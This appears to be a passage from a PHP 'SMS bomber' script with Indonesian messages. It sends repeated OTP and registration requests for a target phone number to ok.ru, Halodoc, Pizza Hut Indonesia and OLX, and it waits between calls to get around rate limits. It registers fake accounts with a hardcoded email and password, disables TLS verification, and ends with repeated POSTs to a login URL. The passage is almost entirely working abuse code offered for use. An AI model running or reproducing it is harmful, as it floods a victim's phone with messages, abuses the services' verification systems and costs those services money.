curl_setopt($ch, CURLOPT_URL, "https://m.ok.ru/dk?st.cmd=newRegEnterPhone&_prevCmd=newRegEnterPhone&bk=NewRegEnterPhone&tkn=1191&_cl.id=1623234971248&_clickLog=%5B%7B%22target%22%3A%22submit%22%7D%2C%7B%22registrationContainer%22%3A%22phone_reg%22%7D%5D");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua14);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, "rfr.posted=set&rfr.phonePrefix=%2B62&rfr.countryCode=id&rfr.countryName=%D0%98%D0%BD%D0%B4%D0%BE%D0%BD%D0%B5%D0%B7%D0%B8%D1%8F&rfr.phone=".$nomor."&getCode=untuk+mendapatkan+kode");
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
echo $yellow2. "\n[wait]".$purple2." mencoba mengirim... [ok.ru]";
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.halodoc.com/api/v1/users/authentication/otp/requests");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua15);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone_number":"+62'.$nomor.'"}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$m=json_decode($result);
$h=$m->message;
if($h=="You can only request 10 OTPs in 30 MINUTES"){
echo $red2. "\n[wait]".$purple2." tunggu 30 mnt [HALODOC]";
}else{
echo $green2."\n[success]".$yellow2." mengirim pesan... [halodoc]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.pizzahut.co.id/customer/v1/customer/register");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua16);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"sianjg@gmail.com","first_name":"mrmajor","gender":1,"last_name":"mrmajor","password":"@Dua2781996","phone":"'.$nomor.'","birthday":"1989-02-01"}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$msg=$js->message;
if($msg=="Successful"){
echo $green2."\n[success]".$yellow2." mengirim pesan... [pizzahut]";
}else{
echo $red2."\n[gagal]".$purple2." 3x/hari [pizzahut]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.olx.co.id/api/auth/authenticate");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua17);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"grantType":"phone","phone":"+62'.$nomor.'","language":"id"}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$is=json_decode($result);
$ms=$is->status;
if($ms=="PENDING"){
echo $green2."\n[success]".$yellow2." mengirim pesan... [olx]";
}else{
echo $red2."\n[pending]".$purple2." menunggu...[olx]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";

}
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $login);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua18);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $login);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua19);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $login);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua20);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
}
}
}
}
